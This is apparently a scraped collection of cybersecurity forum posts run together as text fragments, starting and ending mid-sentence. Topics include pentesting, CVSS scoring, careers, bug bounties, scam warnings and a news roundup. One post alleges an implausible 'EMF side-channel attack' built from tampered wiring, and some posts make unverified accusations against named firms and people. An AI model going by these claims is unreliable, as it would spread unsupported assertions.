behave under real-world conditions, penetration tests provide an accurate picture of exploitability and potential business impact \u2014 something that scanning alone cannot achieve.\n\n\u00a0**Compliance Considerations:** [**PCI DSS**](https://www.clone-systems.com/pci-4-version/)\n\nUnder\u00a0PCI DSS, vulnerability scanning is required for organizations that store, process, or transmit payment card data. External scans are typically performed\u00a0quarterly\u00a0and must be conducted using an approved scanning vendor (ASV).\n\n\u00a0Penetration testing, on the other hand, is required in more specific scenarios, including:\n\n* For\u00a0service providers\n* After significant changes to applications or infrastructure\n* For entities undergoing a\u00a0Report on Compliance (ROC)\n\n\u00a0Even when penetration testing isn\u2019t mandatory, it is considered a best practice \u2014 especially under\u00a0PCI DSS v4.0.1, which places more focus on the\u00a0ongoing validation\u00a0of security controls, not just point-in-time audits.\n\nOrganizations that rely solely on scanning may meet the minimum requirement but still remain exposed to risks that compliance frameworks cannot fully account for.\n\n**What This Means for Your Risk Strategy**\n\nVulnerability scanning and penetration testing are both necessary \u2014 but they serve different purposes.\n\n* Scanning\u00a0provides regular insight into known issues. It\u2019s broad, fast, and automated, but it stops at detection.\n* Penetration testing\u00a0simulates actual attacks to determine how those issues behave in your environment. It offers context, clarity, and confirmation of real-world risk.\n\nOne doesn\u2019t replace the other. Together, they form a more complete picture of your security posture.\n\nOrganizations that invest in both practices \u2014 and understand their distinct value \u2014 are better positioned to reduce risk, meet compliance, and respond to evolving threats with confidence.",

    "text": "Mend and CVSS 3.0 vs. CVSS 4.0. Hey all,\n\nI am new to DevSecOps and I am wrapping my brain around CVSS and processes relating to code development (I formerly used to simply manage infrastructure and operating system vulnerabilities). I am currently leveraging Mend to do code vulnerability scanning and the platform gives you the opportunity to select CVSS 3.0 or CVSS 4.0. Based on what I've read, in order to stay ahead of the industry and because we are starting with a fresh, ground up security program, I thought it would be best to tailor all thing towards the latest standard of CVSS 4.0.\n\nWhile running the program, I leverage both the UI and reports and it came to my attention that in certain circumstances the reports issued different CVSS scores from the UI. When I submitted a support request to Mend, they claimed that this was an expected behavior as the UI can show data based on CVSS 3.0 or CVSS 4.0 but the reports will only generate information based on CVSS 3.0. This resulted in my UI displaying CVE-2024-50379 scoring as a high at 7.2 but my reports showing the same CVE's CVSS score with a critical at 9.8. \n\nBased on the above statement from Mend, I think I am maybe missing some information or may be misinformed:\n\n1. I was not aware that depending on CVSS scoring version that there could be such large differences in scoring evaluation. While I understand that CVSS has reorganized how scoring is assessed, I have not seen any specific references stating that depending on CVSS version, results for the same CVE will vary so greatly (example is a full 2.6 points of differentiation). Is this true? From what I've seen the variation is much smaller. \n2. What is the community's feeling on choosing a CVSS version framework for evaluation? Are people adopting the new 4.0 spec or are most people staying away from 4.0 and staying with 3.0?\n3. In your opinion, is it appropriate for Mend to offer version selection if only their UI can reflect version 4.0? \n4. Does anyone have any good resources that show differences between scores depending on scoring version. I leverage Mend, NIST's database, and CVEdetails.com. While NIST does have a tab to select CVSS version, often details are missing from 4.0 and CVEDetails.com doesn't seem to have any sort of differentiation indication. \n\nThanks in advance for your thoughts and please correct me anywhere I might be wrong.",

Just read The Hacker News' latest weekly recap, and it's a stark reminder of why staying vigilant is non-negotiable in today's threat landscape.\n\n\n\nFrom China-linked UNC5221 exploiting Ivanti VPN flaws to Oracle's silent breach acknowledgment, the article highlights how attackers are finding success through simple oversights rather than sophisticated exploits.\n\n\n\nWhat caught my attention:\n\nSupply chain attacks are becoming more complex, with the GitHub Action compromise traced back to a stolen PAT from SpotBugs\n\nNorth Korean threat actors are adapting their tactics, now using ClickFix social engineering to deliver malware\n\nIdentity-based attacks are surging, with 41% of successful logins involving compromised credentials\n\nThe cybersecurity tip about tracking first-time connections is particularly valuable - attackers may steal credentials or bypass MFA, but they can't fake never having connected before.\n\n\n\nAs security professionals, we must remember that real risk often lives in the blind spots. The threats that worry us most aren't always the loudest - they're the ones we never see coming.\n\n\n\n[https://thehackernews.com/2025/04/weekly-recap-vpn-exploits-oracles.html](https://thehackernews.com/2025/04/weekly-recap-vpn-exploits-oracles.html)",

Hi,\n\nLittle bit of background: I have a non-technical background (business), and I've been diving in Cybersecurity for two years as a cybersec GRC consultant. I'm mostly involved in cybersecurity risk and compliance project, and mostly help large groups with complex NIS2 questions, strategy, implementation, etc.\n\nI have passed the ISO27k lead implementer certification, and I am now looking for a course/certification that would dive in the foundations of technical knowledge. I am talking about Infrastructure, Networks, Cryptography, etc.\n\nI have a decent training budget sponsored by my consulting firm. Current plan is to follow a Security+ course and pass the certification (which would be followed in a year or two by CISSP for CV purposes), and follow the Security Engineer course from TryHackMe, which apparently is a good baseline for technical knowledge.\n\nHas anyone from a non-technical background succeeded in building a strong foundation in knowledge regarding architecture, network, crypto, etc.? What did you do in order to achieve that? Do you think of any course/cert that may be handy in cases like mine?\n\nThanks for your help!",

Even if going on a personal trip, if found with a corporate device (easy enough to spot, especially with hardware tags). The US now seems to be taking a zero tolerance approach and instead of just being flown back, you may end up in detention for an extended period.  \n\nIf you are going to the US, leave all corporate assets at home.

My subscription ends at the end of this month and I'm jamming my two exam attempts into the remainder of my time. I'm likely going to fail and I realize I have no one else to blame but myself. The advice from OffSec is to complete over 80 CTFs to prepare for the exam but all through the process of completing these CTFs, I never felt like my knowledge was compounding in any meaningful way. I continued thinking it will eventually click but it never did. Each CTF had a unique vulnerability and I couldn't figure out how I would logically discover it when reading the write-up.\n\n\n\nMore recently, I've realized my learning and note taking methods were ineffectual so I've revised them but each time I do an OffSec CTF I still don't feel like I'm adding to a knowledge base. More, I'm picking up factoids that may apply in future hacking but I may never see the same vulnerability again.\n\n  \nThroughout this process, I would continue to have these feelings so I would venture out to learn tertiary subjects like devops, system admin, and python development. I was desperate to find information or skills that would link the hacking together. I learned a lot about a lot of different things, and I'm very grateful for that, but I'm still unable to complete most CTFs without assistance.\n\n  \nI have learned through my exploration that I much prefer development. It's satisfying to do and the roadmap to improve is much more clear. I will say, though, that this experience has been positive but frustration. Positive because I'm very happy with everything I've learned over this year but frustration that I won't be able to convert it into something tangible like a certificate. Also, this has revealed some glaring holes in my learning process that I needed to fill and I'm happy it gave me opportunity to address those.\n\n\n\nNow that I'm writing this all out, I see now that I'm probably just burnt out. I'm interested in getting my OSCP, mostly to validate the time and effort I've put in, but I don't think I'll pursue security. I like learning so I may continue with CTFs but without the pressure of a looming exam, just for fun.\n\n  \nThanks for listening to my Ted Talk or whatever.",

People talk a lot about how data is never recoverable once deleted and not backed up to the cloud, and how certain big apps and sites genuinely wipe all the data you have with them or overwrite it after a certain amount of time.

    "text": "How do you find the time/energy to train?. Hey /r/hacking, I've been a security engineer for ~6 years and I'm feeling a bit stagnant. There's so much I want to learn--PowerShell, Python, KQL, Windows/Azure administration, mobile security, threat hunting, etc.--but I'm exhausted. \n\nFor context, I work my 8 hours a day and get my work done on time. My boss is happy. I'm often pinged to do impromptu tasks. I'm single, socialize once or twice a week, and workout 6x a week, roughly two hours a day. I run all of my errands and do my own chores. Admittedly, I could probably get more/higher quality sleep.\n\nI'm usually tired of the computer after work; I want to get outside and socialize and/or exercise. When I get home, I find it difficult to dive into a technical text or training module, either because I can't focus, lack the energy, desire, or a combination of all three. So, I usually wind up doomscrolling or losing myself in a TV show, movie or book. On weekends, I usually workout, socialize, watch a sporting event or two, take a nap, run errands or do chores, and close out the day with a movie or show. I consider it my time to reset. I don't feel like I'm flourishing as a result: I clock in, do my job, and clock out. I'm lacking passion and motivation to evolve in this space. \n\nHow do you all find the time/energy to skill up?",

    "text": "HackerOne is Ghosting.. Hello hacker friends. My experience so far with HackerOne has been pretty poor. I reported an ATO exploit that chained XSS with 3 other vulnerabilities, but it was closed as a duplicate and linked to a year old report.\n\nI don\u2019t think it is ethical to knowingly leave a critical vulnerability unpatched for such an extended period, and HackerOne does not feel like an honest platform. To avoid paying out bounties, they can just link all future XSS vulnerabilities to the previous report indefinitely because there is no accountability.\n\nThe same program claimed to accept subdomain takeovers.\u00a0[target.com](http://target.com/)\u00a0is in scope. They reject a takeover on\u00a0[xyz.target.com](http://xyz.target.com/)\u00a0due to scope, because it does not explicitly include any wildcards.\n\nI have reported other issues too, but there is always an excuse. While some of the triagers on the platform have done a fantastic job, I suspect others are sharing vulnerabilities with each other. Many of my comments have gone unanswered for months, and my email message was ignored. New accounts on the platform cannot request mediation, thus making it impossible to communicate.\n\nI\u2019m over it. They can keep the bounties, but please fix the vulnerabilities so that millions of users are not jeopardized. I have no idea if the company on HackerOne is even aware of these vulnerabilities and when they intend to fix them. Writing articles on Medium detailing these exploits could also improve my chances of landing a job, but it is impossible to request disclosure ethically when the triagers ghost you. It feels like HackerOne cares more about the monetization of its platform than actually helping customers.",

Valid API keys are directed to live OpenAI API endpoints without prompt injection or additional security controls/rate limiting.\n\nDeployment is simple with docker and a basic yaml config file.\n\n[https://github.com/referefref/OpenAIPot](https://github.com/referefref/OpenAIPot)\n\n",

An unknown attacker replaced the website's contents with a sarcastic note: \"Don't do crime CRIME IS BAD xoxo from Prague.\" It's still unclear how the site was taken over, but security researcher Tammy Harper suspects it was vulnerable to a WordPress flaw that could have led to the compromise.\n\nThe Everest gang has been active for at least five years and has listed over 230 victims on their leak site, focusing on healthcare organizations in the US. Most recently, they had started shifting to a more traditional ransomware model, encrypting files in addition to data theft.\n\nFor now, their main platform for extortion is down.

    "text": "Which vendor certification is more marketable for security operations analyst; Splunk,  Microsoft\u2019s SC-200, or Cisco Cybersecurity Associate. I have limited hands-on experience with both Splunk and Microsoft Defender and Sentinel. I have no experience with Cisco security. My Splunk experience comes from doing projects. My experience with MS Defender and Sentinel is a mix of projects and work. \n\nPeople often say go with what your org uses. My current employer is a global company. The security operations team uses Defender and Sentinel, but this team is managed by a company called TCS. In fact, we use TCS for all level one support. We do have FTEs that are incident responders but that\u2019s not a role I would be able to pivot into. My employer does have other security teams but getting on those teams are slim as well. For me to get a cybersecurity role, chances are that I\u2019ll have to break away from my employer.\n\nI was thinking about breaking in via IAM since I have more work experience in this, but I find setting up IAM projects rather tedious. The fun part of IAM for me is the technical work and IAM projects seem to be a mix of GRC and technical work. \n\nSecurity analysts projects on the other hand have been fun and exciting from the get go so I think this would be a better fit for me. And thus, the above question. If it helps, I have years of experience in IT. I\u2019ve done service desk, help desk, Intune administration and systems administration. I think adding a SIEM and/ SOAR certification to my resume along with the projects I\u2019ve done would improve my chances. \n",

Hey, built an open source tool that does code scanning via the popular LLMs. \n\nRight now I\u2019d only suggest using it on smaller code bases to keep api costs down and keep from rate limited like crazy. It also works on pull requests but that\u2019s a bit niche.\n\nIf you\u2019ve got an app your testing and it has open source repos, it should be a really good tool. I wouldn\u2019t recommend feeding in your closed source code to LLMs but ollama will probably be fine.\n\nYou just need either an api key or ollama.\n\nReally keen for feedback. It\u2019s definitely a bit rough in places, and you get a LOT of false positives because it\u2019s AI\u2026 but it finds stuff that static scanners miss (like logic bugs).\n\nAlso keen for contributors. There\u2019s a lot of vendors wrapping ChatGPT nowadays, but this will stay open source. The LLM does the heavy lifting, the code just handles feeding it in and provides a couple tools to give the LLM extra context as needed.\n\nhttps://github.com/punk-security/SAIST",

Get free early access to a feature we are testing!\u00a0\n\nWe added a new fast way to create projects from an SBOM (currently you need a requirements file).\u00a0\n\nAfter creating a project you get our existing feature of your projects packages / dependencies being matched to vulnerabilities. You can then view and search across all your projects for any specific vulnerability or dependency.\u00a0\n\nIf you wanted to patch the other new feature is if you select a different version of a python package (or python itself) being able to see the net change in vulnerabilities, and the associated breaking changes in the updated libraries, for that change.

But the failure rate isn't anecdotal, it's measurable.\n\nWe compiled results from 17 independent public evaluations - peer-reviewed studies, NIST SATE reports, and large-scale academic benchmarks.\n\nThe pattern was consistent:  \n**Tools that performed well on benchmarks failed on real-world codebases.** In some cases, vendors even requested anonymization out of concerns about how they would be received.\n\nThis isn\u2019t a teardown of any product. It\u2019s a synthesis of already public data, showing how performance in synthetic environments fails to predict real-world results, and how real-world results are often shockingly poor.\n\nHappy to discuss or hear counterpoints, especially from people who\u2019ve seen this from the inside.",

Anyone with a deeper understanding about cybersecurity risks able to explain the security and workings of the HuggingFace \"serverless dedicated inference endpoint\". We have been building a solution using them and are quite satisfied but are now approaching a phase where data privacy becomes a much more important consideration, due to the confidential nature of documents that we are analysing. \n\nTo clarify, our solution never sends a full document to the endpoint, it operates in RAG fashion, so some pre-filtering is done and only a selected number of snippets are sent to the endpoint (where an LLM returns answers). \n\nIt seems to be my understanding that, while the endpoints themselves are dedicated, the server itself is shared and I'm wondering whether that is a source of concern for us (from a data privacy perspective) compared to having access to a fully dedicated server (if that is even possible via HF).\n\nI should add that HF is only a temporary solution to use off-the-shelf LLM models to cater for short-term demand while in the medium run an internal one is being built that will ultimately be hosted at our own premises. \n\nAppreciate any insight!",

Hello r/Cybersecurity!\n\nI'm a first-year student at Mumbai University, and I'm conducting research as part of my coursework on\u00a0**AI-Driven Digital Arrest Scam Detection**. I'm exploring how AI can be used to identify and prevent these increasingly sophisticated scams, particularly within the Indian context.\n\nIf you're a cybersecurity professional with experience in threat analysis, fraud detection, or incident response, your expertise would be invaluable! This short, anonymous survey focuses on the tactics used in digital arrest scams, how scammers are leveraging AI, and the effectiveness of current prevention methods.\n\n**Here is the link to the survey (Google Forms):** [**https://docs.google.com/forms/d/e/1FAIpQLScHtgR-aJj4F1qJxC0zSkJlrz9C0mqwXkPd6eO1eTSD32XBjg/viewform?usp=dialog**](https://docs.google.com/forms/d/e/1FAIpQLScHtgR-aJj4F1qJxC0zSkJlrz9C0mqwXkPd6eO1eTSD32XBjg/viewform?usp=dialog)\n\n**Key Questions Addressed in the Survey:**\n\n* What are the most common tactics you've seen used in digital arrest scams?\n* How are scammers using AI to enhance their tactics?\n* What are the legal frameworks in place to address digital arrest scams in India?\n\n**Disclaimer**\n\n* This survey is completely anonymous.\n* I will not collect email addresses or any other personal data that could identify you.\n* Your participation is voluntary, and you are free to skip any questions you are not comfortable answering.\n\nIf you have any questions about the survey or would like to share additional insights, please feel free to comment here or send me a direct message. I'll be monitoring this account for inquiries and feedback, and your anonymity will be respected.\n\nThank you for contributing to my research!",

Am I wrong for feeling like Ryan Montgomery is a fraud?\n\nFull disclosure, I am a security enthusiast (getting into appsec) and a full stack web dev so I may be misinterpreting the skill this guy has, but from everything I've seen and heard, it all seems like a lie.\n\nOpinions?\n\nEdit: Thank you all for the discussion and correction to my fraud statement.

    "text": "NEX Labs / Nixguard Scam Warning (Toronto, Ontario). Hey guys, making this account to warn about a recent scam,\n\nA couple weeks ago I applied for a cyber security position at a company named \"NEX Labs\".  They seem to be out of Newmarket, Ontario (in Canada),  and jobs are very hard to find right now, so I was applying to any roles I can get as I was recently laid off.  I have about 2 years experience in cybersecurity and about 6 years as a software engineer prior to that.  The role seemed to be more junior level but hey I have bills to pay so I submitted my application.  A couple days later the founder sent me a long message on LinkedIn giving instructions for a \"challenge\" that must be considered to be considered for the job.\n\nOne thing I found super weird was that I had to sign up for a free trial for their product in order to do this challenge.  Like, the company I was applying to wanted me to sign up for their own free trial.  This was pretty sketchy right off the bat, but I can cancel my cards very easily and the payment was via Stripe so I went through with it anyways.  Yes I know this was stupid, anyone in cybersecurity would tell you that you dont need to submit payment details to be considered for a job - alas I was desperate and thought I had reasonable protection.\n\nRight after starting, there were instructions to set up this tool, and then questions afterwards.  None of the questions had anything to do with cybersecurity, my experience, positions I've worked, problem solving skills, none of that.  It was basically just a product review disguised as a job interview.  Weird, and extremely unprofessional, but once again I'm just trying to pay my bills and be able to eat.  At this point it started to seem like there was probably no job at all, and this was just some slimy tech bro trying to trick people into giving him reviews/product guidance while pretending that he might offer them a job.  As I started to do some research, I found a reddit thread and a linkedin post from others who also interacted with this scammer.  I reported his post and stopped communicating with him.\n\nI'm making this post today to warn people because he is still posting fake jobs on linkedin.  Anyone in the Greater Toronto Area, if you see an advertisement to work as a cybersecurity analyst for \"Nex Labs\" or a product called \"Nixguard\", do your research, there a ton of red flags and it is almost surely a scam one way or another.\n\nLooking into their product more,  I think the founder is likely the developer of this \"product\" as well, if you want to call it that.  It's really just a free, open source version of Wazuh that he downloaded,  make black/green, put a crypto button on it, and then locked it down so he could sell it.  It also seems like he tried to integrate chatgpt into it, however the integration is so poor I did not even bother using it after a couple tries.  Its literally just an openai call with a couple lines of system prompts added to the message.  Just to reiterate, their product is FREE Wazuh, colored black/green, with a crypto button, and a half assed chatgpt integration.  And I don't think he has any clue about deployment or has ever sold this product before, because its running off a bash script to set everything up.  Any of the code that appears to be written by him has obvious signs of being written by chatgpt, and I'd say for a competent developer there is maybe 2-3 hours of work to recreate his whole \"product\".\n\nThe cherry on top of the cake is that he also has a reddit account and has had multiple public meltdowns both on reddit and linkedin when he is called out.  He will resort to insults saying people don't understand his company or cyber security.  So I'd like to ask you directly, u/Choice-Salamander-16 , What is your background in cybersecurity?  What is your product? How is this different from the free version of Wazuh (other than being reskinned and a crypto button)?  Who are your clients?  What is your purpose of hiring a cybersecurity analyst?  I don't think you can answer a single one of these questions, nor can you explain why it would ever be acceptable to ask for payment details/to sign up to some trial as a part of your hiring process.\n\nCheers and be careful everyone!",

    "text": "EMF Side-Channel Cyber Attack discovery in Houston Communities.  Possibly been around since at least 2012.. I've spent 3 years conducting a forensic engineering investigation on a persistent, untraceable, and completely resistant to conventional cyber security practices.  It exploits extreme vulnerabilities in utility infrastructure and failure of companies to properly maintain and clean abandoned lines - in this case attackers created big induction loops in overhead wiring - that been around since 2012, indicating this attack vector has possibly been used undetected for at least 13 years.  It also exploits big gaps in electrical and hvac code - attackers stategically place data lines and AC control lines adjacent to high voltages.  In this case, the hvac units insulated coil vent lines induce generate large magnetic interference with loud bass music.  The attackers coiled the control wire to form an induction antenna to enable control of the AC unit. Attackers coat grounding rods and hardware with non-conductive coating to give appearance of grounding.  Electrical lines in attic lights were found to have large induction loops and data lines placed in close proximity.  The attack also relies on tampering with or intentional manufacturing or supply chain issues with power supplies.  I'm consistently finding voltage-backflow diodes intentionally removed from power supplies enabling susceptibility to voltage spikes which lead to memory corruption issues that attackers exploit.  For power over Ethernet cameras, I've identified similar removal of voltage backflow diodes on power board, and observed improper grounding of various boards on reolink cameras creating a voltage instability and again memory corruption issues.  For wired mouse and keyboard, I've observed two ground wires, one ground wire significantly shorter than the other and the other wire and data wires wrapped about a donut magnet - again this causes voltage instability.   On AC units, I observed attackers applied annodization the metal jacket of motors, thus decoupling the shielding around the copper wires from the ground line - again the results in enormous EMF attackers exploit in conjunction with the tampered power supplies.  The attackers and/or manufactures apply annodization improperly to grounding screws on electronics and heat sinks.  I have also noticed tampering with grounding of hdmi ports, usb ports, and Ethernet ports.  For Ethernet ports, I have observed data flow protection diodes missing from send/receive pin creating obvious data corruption issues.  I am seeking help from this community - and if you happen to live in Houston, please help me - I am not a cyber security professional, but I am a forensic engineer.",

I was originally hired to cover networks, social engineering, and web, but I've been pigeonholed into solely web app pentesting during my 8 months there so far. During my initial interviews and ongoing team meetings, I expressed my interest in areas like Windows internals/APIs, completed Entra/Azure pentesting certs, and am even contributing to our internal network pentest infrastructure.  \n\n\nDespite this, I'm consistently assigned to web app projects and am frankly getting burned out. I don't mind doing them from time-to-time, but I have no interest in pursuing web security in the long-term and am more interested in red team operations.  \n\n\nTo my point - I'm now wondering if it might be wise to bring up the fact that I left my previous job due to a similar pigeonholing situation with web apps. I do have a good rapport with my manager and the team, but I don't want to come off as negative or unprofessional. How would you go about approaching this situation? To be clear, I know there is demand for network pentests. There are consultants on the team that do that exclusively. I am qualified to do this type of work, but I keep getting assigned by other PMs to do web apps even though I have requested to have a better balance about 3 times now.\n\n  \nThanks in advance!!",

To better understand these concepts, I built **PassCrax**, a tool that helps analyze and demonstrate hash properties.  \n\n**What it demonstrates:**  \n- Hash identification (recognizes algorithm patterns like MD5, SHA-1)   \n- Educational testing \n\n**Why I'm sharing:**  \n1. I'd appreciate feedback on the hash detection implementation  \n2. It might help others learning crypto concepts  \n3. Planning a Go version and would love architecture advice  \n\n**Important Notes:**  \n Designed for educational use on test systems you own    \n Not for real-world security testing (yet)  \n\nIf you're interested in the code approach, I'm happy to share details to you [here](https://github.com/TAUREAN312/PassCrax.git). Would particularly value:  \n- Suggestions for improving the hash analysis  \n- Better ways to visualize hash properties  \n- Resources for learning more about modern password security  \n\nThanks for your time and knowledge!  \n",

This is a wrong and weak mindset. If there is a breach, people will be looking at us and say why we didn't make a decision to force a change.\n\nIf the organisation is doing bad security practices, we should keep forcing people to choose a more secure practices.\n\nI am not a ciso and if my ciso is wrong, he needs to be challenged. If the management refuses to change, then decide that this is not a right org to work in.",

The uncompressed file size is 159381 bytes while the first block size table member is 7206 bytes. It seems that the manifest file is encrypted and/or compressed or it's missing. I checked the first file in a hex editor and there seems to be no zlib header.  \n  \nMaybe it's implied by the engine when it's read? Or maybe it's encrypted? Or the manifest file could be completely missing and the file paths are in the game's executable? Or it could just be my program's fault?\n\nI opened a hex editor and manually parsed it and it seems to check out. I also used binwalk on it and got a bunch of .zlib files the seem to be valid.

In an era where cybercrime drains trillions from the global economy each year, an unexpected ally has stepped into the spotlight: hackers. However, these aren\u2019t the nefarious figures behind data breaches or ransomware schemes. Rather, they\u2019re ethical hackers, rewarded through bug bounty programs for exposing vulnerabilities before criminals can exploit them. As a result, bug bounties have reshaped cybersecurity, turning potential threats into guardians of the digital world. This article delves into how these programs function, their significance in bolstering security, and practical tips for companies and individuals to embrace this innovative strategy.",

    "text": "Redirected to malicious domain, somehow surpassed browser guard.. Hello everybody,\n\nAbout a month ago I tried to visit a well known streaming site that I always use. This site has no ads or popups and is generally well trusted. As I typed in the URL and hit enter I got redirected to 'cibago. com/\\[random string of letters and numbers\\]', then after quickly being redirected to several subdomains I finally landed on the TotalAV product page.\n\nI thought it was weird that TotalAV would be advertising on a piracy website so I went in to my history and clicked the original cibago link I was redirected to, and this time my malwarebytes browser guard blocked it as a phishing link, but for some reason the first time it did not!\n\nI did some research on the domain and literally every resource said the domain was suspicious. [Right here](https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1) is and [here](https://otx.alienvault.com/indicator/domain/cibago.com) the is the domain on LevelBlue OTX and as you can see it is definitely associated with ransomware and other malware. On the former link it seems that you can see the whole redirect chain, ending on [www.TotalAV.com](http://www.TotalAV.com). [Here](https://www.virustotal.com/gui/domain/cibago.com) you can see the domain is also flagged by 6 vendors on virus total, but they don't specify anything.\n\nI made an any.run account and tried running the domain to see if I can see any drive-by downloads and such, but I just don't have the expertise to understand what I'm seeing. I've since run HitmanPro, Malwarebytes etc. and my device seems clean, but we all know how easy it is to evade antivirus. I also had brave shields on at the time, but I didn't have scripts blocked or anything because it breaks websites, and somehow this redirect evaded my browser guard the first time so who knows.\n\nSo my questions are:\n\n1. Why didn't my browser guard stop this the first time?\n2. This domain is associated with malware, should I be worried about drive-by downloads?\n3. If drive-by downloads are associated with this domain, then there may be a ticking time bomb waiting on my PC.... What do?\n\nIf anybody who has access to any.run, JoeSandbox or any other analysis tool that actually knows what to look for would be able to run the associated domains to analyze for script injection or drive-by downlaods, that would be much appreciated!! I can't stop thinking about how I was on this clearly suspicious ransomware domain, and that my computer may be actively infected.\n\nThanks to anybody who's able to help and please let me know if you find anything!\n\nLevelBlue OTX:\n\n[https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1](https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1)\n\n[https://otx.alienvault.com/indicator/domain/cibago.com](https://otx.alienvault.com/indicator/domain/cibago.com)\n\nVirusTotal:\n\n[https://www.virustotal.com/gui/domain/cibago.com](https://www.virustotal.com/gui/domain/cibago.com)",

    "text": "Passive BLE Trust Trigger on macOS During iPhone DFU Restore. Posting a documented case that may reflect a trust model vulnerability or passive local provisioning exploit via BLE on Apple systems.\n\n---\n\n### Summary:\nWhile DFU-restoring an iPhone to iOS 18.4 on a MacBook Pro (Apple Silicon, macOS 15.3.2), the system:\n- Triggered `UARPUpdaterServiceDFU`, `accessoryupdaterd`, and `mobileassetd`\n- Queried Apple\u2019s MESU and MDM endpoints (`mesu.apple.com`, `gdmf.apple.com`, `mdmenrollment.apple.com`)\n- Launched DFU provisioning logic in response to a **Bluetooth connection from an unknown Apple Watch (model A2363)** \u2014 a device I\u2019ve never owned or paired\n\n### Supporting Observations:\n- No login session was active\n- DFU session was `peer=true` over BLE, suggesting trust was silently granted\n- Trust store temporarily upgraded to `2025022600` then rolled back\n- No MDM enrollment present (confirmed via GSX/IMEI tools)\n\n### Peripheral Symptoms:\n- iPad with no known iCloud login showed a phantom signed-in Apple ID in Spotlight\n- Wi-Fi networks (e.g. `HP-Setup`, `Canon_xxxx`) auto-prioritized and installed drivers/queues without interaction\n- Cellular provisioning UI grayed out despite data usage confirmed by apps\n\n---\n\n### Why This May Matter:\n- Suggests a **passive trust vector** can trigger firmware/restore behavior via BLE proximity alone\n- macOS and iOS treated the accessory as **trusted without user consent or active pairing**\n- Might reflect:\n  - Internal provisioning image behavior\n  - Ghosted DEP assignment\n  - Or an exploitable path to trigger system daemons remotely\n\n---\n\n### Looking For:\n- Anyone who has seen BLE-triggered trust elevation on Apple systems\n- Security researchers familiar with UARP, MESU, or Apple Configurator internals\n- Confirmation whether Apple Watch DFU trust over BLE is gated by pairing, MDM, or device supervision\n\nHappy to share sanitized logs and timelines via DM or off-platform. This has been reproduced across devices and appears consistent.",

I am in talks with an IT/cybersecurity firm about them installing some equipment and helping out with activity monitoring.

    "text": "Top cybersecurity stories for the week of 04-07-25 to 04-11-25. Host Rich Stroffolino will be chatting with our guest,\u00a0**Carla Sweeney, SVP, InfoSec, Red Ventures**\u00a0about some of the biggest stories in cybersecurity this past week. \n\nYou are invited to watch and participate in the live discussion. We go to air at 12:30pm PT/3:30pm ET. Just go to YouTube Live here\u00a0[https://youtube.com/live/Zb2Oe9WaAKY](https://youtube.com/live/Zb2Oe9WaAKY)\u00a0or you can\u00a0[subscribe to the Cyber Security Headlines podcast](https://cisoseries.com/subscribe-podcast/)\u00a0and get it into your feed.\n\nHere are the stories we plan to cover:\n\n**Researcher creates fake passport using ChatGPT**  \nPolish researcher Borys Musielak used ChatGPT-4o to generate a fake passport in five minutes, suggesting that the document is \u201crealistic enough to bypass automated Know Your Customer (KYC) checks.\u201d Musielak emphasized \u201cthe growing risk of mass identity theft for purposes such as fraudulent credit applications or the creation of fictitious accounts\u2026\\[enabling\\] malicious actors to mount broad attacks on banking, cryptocurrency, and other financial infrastructures.\u201d Just 16 hours after his announcement ChatGPT modified its prompt rules to no longer generate fake passports.  \n([Tech News](https://securityexpress.info/fake-passport-generated-by-chatgpt-bypasses-security/))\n\n**Apple appeals UK encryption back door order**  \nThe UK\u2019s Investigatory Powers Tribunal, or IPT, confirmed Apple filed an appeal on an order that would require it to create a back door in its Advanced Data Protection feature as part of its cloud storage. We know this because the IPT refused an application by the British government to keep to \u201cthe bare details of the case,\u201d including the identity of any filing parties, under the argument that it could damage national security. The Financial Times reported that Apple appealed the order, but we now have official confirmation. A hearing on the appeal was already held last month in London, but no media access was permitted.  \n([Reuters](https://www.reuters.com/technology/apple-appealing-against-uk-governments-back-door-order-tribunal-confirms-2025-04-07/))\n\n**Oracle confirms \u201cobsolete servers\u201d hacked**  \nOracle has finally confirmed via email notifications to customers that hackers leaked credentials stolen from its servers. The notification said, \u201cOracle would like to state unequivocally that the Oracle Cloud\u2014also known as Oracle Cloud Infrastructure or OCI\u2014has NOT experienced a security breach.\u201c A hacker was able to access user names and passwords from two obsolete servers that were never a part of OCI. Oracle said, because the passwords were hashed, the hacker was unable to access any customer environments or data. Researcher Kevin Beaumont said that Oracle\u2019s denials of a breach of \u2018Oracle Cloud\u2019 is wordplay since the breached servers were part of Oracle\u2019s older cloud services environment which it rebranded as \u201cOracle Classic.\u201d  \n([Bleeping Computer](https://www.bleepingcomputer.com/news/security/oracle-says-obsolete-servers-hacked-denies-cloud-breach/))\n\n**President orders probe of former CISA Director Chris Krebs**  \nPresident Donald Trump signed an Executive Order on Wednesday intended to remove the security clearance of Chris Krebs, who had served as director of CISA and who was fired in 2020 after having states he there had been \u201cno technological issues with the presidential election.\u201d The EO not only directs agencies to revoke Krebs\u2019 security clearance but also to \u201csuspend those held by individuals at entities associated with Krebs,\u201d including the cybersecurity firm SentinelOne, where he is the chief intelligence and public policy officer. That directive is \u201cpending a review of whether such clearances are consistent with the national interest,\u201d according to a fact sheet supplied by the White House.  \n([The Record](https://therecord.media/trump-memo-chris-krebs-cisa-sentinelone))\n\n**Researchers warn about AI-driven hacking tool**  \nResearchers at SlashNext published details about Xanthorox AI, a modular AI-driven hacking tool first spotted on hacker forums last month. Xanthorox uses five operation models to handle\u00a0 \u201ccode generation, vulnerability exploitation, data analysis, and integrates voice and image processing, making it capable of both automated and interactive attacks.\u201d Previous AI-based tools we\u2019ve covered like WormGPT, use jailbroken or workarounds to run on existing LLMs, but Xanthorox runs on a self-contained architecture on dedicated servers, with its operators claiming it is a custom LLM.  \n([Dark Reading](https://www.darkreading.com/threat-intelligence/autonomous-genai-attacker-platform-chat))\n\n**Waymo may use interior camera data to train generative AI models, but riders will be able to opt out**  \nWaymo plans to use video from its robotaxi interior cameras\u2014potentially linked to rider identities\u2014to train generative AI models, according to an unreleased privacy policy update. While riders will have the option to opt out, the move raises privacy concerns, especially since the data may also be used for ad personalization. Waymo, which now logs over 200,000 weekly paid rides, is expanding into new markets and exploring additional revenue streams amid ongoing financial losses and heavy R&D investment.  \n([TechCrunch](https://techcrunch.com/2025/04/08/waymo-may-use-interior-camera-data-to-train-generative-ai-models-sell-ads/))\n\n**Phishing kits now vet victims in real-time**  \nThreat actors have been spotted employing a new evasion tactic called 